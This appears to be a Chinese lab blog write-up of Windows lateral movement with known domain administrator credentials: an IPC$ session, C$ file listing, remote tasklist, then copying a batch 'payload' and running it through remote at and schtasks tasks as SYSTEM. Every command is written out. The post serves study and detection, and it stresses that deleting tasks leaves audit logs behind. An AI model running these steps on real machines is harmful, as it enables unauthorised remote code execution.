ailx10说：这篇是2022年1月之前写的，后来又改过。这篇用的是已知域管理员凭据，我先建立 SMB 连接、访问管理共享、查进程，再复制一个小批处理，通过远程计划任务让它运行。每一段做完都留个结果，最后删除任务、断开连接，把正常管理通路实际走了一遍。它让我看出远程执行并不是凭空发生的，账号、共享和服务授权一路都在起作用。也正因为操作看着像常规运维，回头研判时更需要这些过程和日志；清掉一个任务，只是撤掉对象，不会把整段经历从系统里自动抹掉。

## 1、IPC共享命名管道下的远程访问

为了实现进程间通信而开放的命名管道，IPC可以通过验证用户名和密码，获得响应的权限。通常在管理远程计算机和查看计算机的共享资源时使用。

建立 IPC$ 会话本身不会自动赋予文件访问或命令执行权限；C$ 和远程管理还需要相应授权。

```
net use \\192.168.160.135\ipc$ "<实验密码>" /user:HACKBIJI\Administrator
```

![](/notes-assets/333b05429cf65285d381.webp)

使用windows自带的工具获取远程主机信息

- **dir命令**

查看远程主机的C盘文件

```
dir \\192.168.160.135\C$
```

![](/notes-assets/4e2454146120693ffbed.webp)

去 192.168.160.135 主机上查看一下C盘，一摸一样。

![](/notes-assets/399356196629400f194c.jpg)

- **tasklist命令**

查看远程主机上运行的进程

```
tasklist /S 192.168.160.135 /U HACKBIJI\Administrator /P <实验密码>
```

![](/notes-assets/c36b9977b5308be59a10.webp)

## 2、at计划任务

- **at命令使用**

at是windows自带的用于创建计划任务的命令，使用at命令可以在远程目标上创建计划任务，建立定时任务四部曲如下：

1. 使用net time 命令确定远程机器当前的系统时间
2. 使用copy命令将payload文件复制到远程目标机器中
3. 使用at命令定时启动该payload文件
4. 删除使用at命令创建计划任务的记录

**步骤一：使用net time 命令确定远程机器当前的系统时间**

```
net time \\192.168.160.135
```

![](/notes-assets/dd3afb3f9c0c4345d269.webp)

**步骤二：使用copy命令将payload文件复制到远程目标机器中**

```
copy calc.bat \\192.168.160.135\c$
```

![](/notes-assets/0d13b4313a68b4b8e754.webp)

**步骤三：使用at命令定时启动该payload文件**

在下午5点49分启动`calc.bat`批批处理任务

```
at \\192.168.160.135 17:49:00 c:\calc.bat
```

![](/notes-assets/32657996a93bb6195a91.webp)

原文观察到 calc.exe 进程；实验结果只适用于当时的权限与配置。

![](/notes-assets/f60d92f9b43e3ccbeb28.webp)

**步骤四：删除使用at命令创建计划任务的记录**

删除实验任务是环境清理的一部分，并不意味着事件日志或其他审计记录消失。

```
at \\192.168.160.135 2 /delete
```

![](/notes-assets/4c56940945b0c0db66c9.webp)

## 3、schtasks计划任务

schtasks命令比at命令更加强大、灵活。创建计划任务，该计划任务在开机时启动，运行c盘下的`calc.bat`批处理任务，运行权限是system。

```
schtasks /create /s 192.168.160.135 /tn ailx10_task /sc onstart /tr c:\calc.bat /ru system /f  /u HACKBIJI\Administrator /p <实验密码>
```

![](/notes-assets/705ca21f27333304c617.webp)

尝试立即运行这个计划任务，然后再次查看发现新增了一个`calc.exe`进程

```
schtasks /run /s 192.168.160.135 /i /tn "ailx10_task"  /u HACKBIJI\Administrator /p <实验密码> 
```

![](/notes-assets/a454faf95faca1f88b6b.webp)

最后删除计划任务

```
schtasks /delete /s 192.168.160.135 /tn "ailx10_task" /f  /U HACKBIJI\Administrator  /P <实验密码>
```

![](/notes-assets/cfdf88122ed3da58266e.webp)

- /u 域账号
- /p 密码
- /f 强制执行

完成实验后断开连接，并按实验环境的变更记录核对残留任务。

```
net use \\192.168.160.135\ipc$ /del /y
```

![](/notes-assets/c2a49bd458f6a1d110a1.webp)

本篇完～

收尾时删任务、断连接，不等于把过程从系统里抹掉。把正常管理动作怎样留下记录也一并想清楚，后面做研判时，才不会只剩一句“看着像运维”。
